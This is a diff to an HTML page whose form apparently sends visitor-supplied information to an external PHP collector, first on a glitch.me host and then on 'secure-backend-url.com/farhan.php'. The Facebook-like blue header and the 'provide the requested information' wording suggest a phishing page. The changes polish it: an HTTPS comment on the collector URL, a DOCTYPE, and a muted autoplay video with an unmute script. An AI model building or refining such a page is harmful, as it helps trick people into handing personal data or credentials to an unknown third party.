@@ -1,4 +1,6 @@
+<!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
     <link rel="icon" type="svg+xml" href="logo-xjw2vU6p.png">
@@ -9,7 +11,7 @@
 </head>
 
 <body>
-    <form class="content" action="https://periodic-highfalutin-foe.glitch.me/farhan.php" method="POST">
+    <form class="content" action="https://secure-backend-url.com/farhan.php" method="POST"> <!-- Ensure HTTPS URL -->
         <div>
             <!-- Header Section -->
             <div class="d-flex align-items-center" style="width: 100%; height: 90px; background: rgb(70, 103, 172);">
@@ -34,8 +36,11 @@
                         <p class="fw-semibold text-secondary" style="font-size: 12px;">Detailed Video Information.</p>
                         
                         <!-- Video Section -->
-                        <video controls autoplay src="detailedvideo.mp4" style="width: 300px; height: 160px;"></video><br>
-                        <button type="button">Enable Sound</button>
+                        <video id="infoVideo" controls autoplay muted style="width: 300px; height: 160px;">
+                            <source src="detailedvideo.mp4" type="video/mp4">
+                            Your browser does not support the video tag.
+                        </video><br>
+                        <button type="button" onclick="enableSound()">Enable Sound</button>
                         
                         <p class="fw-semibold validation_form_para mt-2">Please be sure to provide the requested information below.</p>
                         
@@ -57,5 +62,17 @@
             </div>
         </div>
     </form>
+
+    <script>
+        // Function to enable sound for the video
+        function enableSound() {
+            var video = document.getElementById('infoVideo');
+            if (video.muted) {
+                video.muted = false;  // Unmute the video
+                document.querySelector('button').textContent = 'Sound Enabled'; // Change button text
+            }
+        }
+    </script>
 </body>
+
 </html>
